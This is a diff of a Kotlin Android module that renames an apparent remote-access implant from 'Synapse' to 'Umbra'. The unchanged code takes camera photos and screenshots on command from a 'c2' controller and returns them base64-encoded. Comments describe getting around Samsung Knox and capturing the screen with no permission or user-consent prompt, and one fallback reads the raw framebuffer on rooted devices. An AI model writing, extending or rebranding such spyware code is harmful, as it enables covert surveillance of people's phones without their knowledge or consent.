@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.graphics.Bitmap
@@ -11,8 +11,8 @@ import android.os.Handler
 import android.os.HandlerThread
 import android.util.Base64
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import java.io.ByteArrayOutputStream
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
@@ -23,7 +23,7 @@ import kotlin.coroutines.suspendCoroutine
 
 object CameraModule {
 
-    private const val TAG = "Synapse.Camera"
+    private const val TAG = "Umbra.Camera"
     private const val CAPTURE_TIMEOUT_SEC = 10L
     private const val SCREENSHOT_TIMEOUT_SEC = 8L
 
@@ -32,7 +32,7 @@ object CameraModule {
      * Tries Camera2 API first; if it fails (e.g., Samsung Knox blocks Camera2),
      * falls back to screenshot capture via MediaProjection / shell screencap.
      */
-    suspend fun capture(context: Context, cmd: Command): SynapseResponse {
+    suspend fun capture(context: Context, cmd: Command): UmbraResponse {
         // ── Try Camera2 first ──
         val cameraResult = tryCaptureWithCamera2(context)
         if (cameraResult != null) {
@@ -48,7 +48,7 @@ object CameraModule {
      * Standalone screenshot action (no camera permission needed).
      * Uses MediaProjection if available, falls back to shell screencap.
      */
-    suspend fun screenshot(context: Context, cmd: Command): SynapseResponse {
+    suspend fun screenshot(context: Context, cmd: Command): UmbraResponse {
         return takeScreenshot(context)
     }
 
@@ -56,7 +56,7 @@ object CameraModule {
     // Camera2 attempt — returns null if it fails (so caller can fall back)
     // ─────────────────────────────────────────────────────────────────────
 
-    private suspend fun tryCaptureWithCamera2(context: Context): SynapseResponse? {
+    private suspend fun tryCaptureWithCamera2(context: Context): UmbraResponse? {
         return try {
             captureInternal(context)
         } catch (e: Exception) {
@@ -65,7 +65,7 @@ object CameraModule {
         }
     }
 
-    private suspend fun captureInternal(context: Context): SynapseResponse? {
+    private suspend fun captureInternal(context: Context): UmbraResponse? {
         val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
 
         val cameraId: String = try {
@@ -87,7 +87,7 @@ object CameraModule {
 
         val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)
 
-        val handlerThread = HandlerThread("SynapseCamera").apply { start() }
+        val handlerThread = HandlerThread("UmbraCamera").apply { start() }
         val handler = Handler(handlerThread.looper)
 
         val device: CameraDevice = try {
@@ -152,7 +152,7 @@ object CameraModule {
 
             val bytes = jpeg.get()
             return if (bytes != null && bytes.isNotEmpty()) {
-                SynapseResponse.CameraResponse(
+                UmbraResponse.CameraResponse(
                     image_base64 = Base64.encodeToString(bytes, Base64.NO_WRAP),
                     width = width, height = height, format = "JPEG", size_bytes = bytes.size.toLong()
                 )
@@ -173,7 +173,7 @@ object CameraModule {
     // Screenshot: shell screencap (no permission / UI consent needed)
     // ─────────────────────────────────────────────────────────────────────
 
-    private fun takeScreenshot(context: Context): SynapseResponse {
+    private fun takeScreenshot(context: Context): UmbraResponse {
         // Method 1: shell screencap command (most reliable, no UI)
         try {
             val result = captureViaShell()
@@ -190,14 +190,14 @@ object CameraModule {
             Log.w(TAG, "Framebuffer capture failed: ${e.message}")
         }
 
-        return SynapseResponse.ErrorResponse("screenshot:all_methods_failed", "camera")
+        return UmbraResponse.ErrorResponse("screenshot:all_methods_failed", "camera")
     }
 
     /**
      * Capture screenshot via shell `screencap` command.
      * Works without user consent on most devices (no camera / overlay permission needed).
      */
-    private fun captureViaShell(): SynapseResponse? {
+    private fun captureViaShell(): UmbraResponse? {
         val start = System.currentTimeMillis()
         val process = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
         val bytes = process.inputStream.readBytes()
@@ -214,7 +214,7 @@ object CameraModule {
         val elapsed = System.currentTimeMillis() - start
         Log.d(TAG, "Shell screencap: ${bytes.size} bytes, ${width}x${height}, ${elapsed}ms")
 
-        return SynapseResponse.ScreenshotResponse(
+        return UmbraResponse.ScreenshotResponse(
             image_base64 = Base64.encodeToString(bytes, Base64.NO_WRAP),
             width = width,
             height = height,
@@ -227,7 +227,7 @@ object CameraModule {
      * Fallback: attempt to read raw framebuffer from /dev/graphics/fb0.
      * Only works on rooted devices with framebuffer support.
      */
-    private fun captureViaFramebuffer(): SynapseResponse? {
+    private fun captureViaFramebuffer(): UmbraResponse? {
         // Try common framebuffer paths
         val fbPaths = listOf("/dev/graphics/fb0", "/dev/fb0")
         for (fbPath in fbPaths) {
@@ -245,7 +245,7 @@ object CameraModule {
                 Log.d(TAG, "fb0 raw read: ${headerBytes.size} bytes from $fbPath")
 
                 // Encode as base64 with a note
-                return SynapseResponse.ScreenshotResponse(
+                return UmbraResponse.ScreenshotResponse(
                     image_base64 = Base64.encodeToString(headerBytes, Base64.NO_WRAP),
                     width = 0,
                     height = 0,
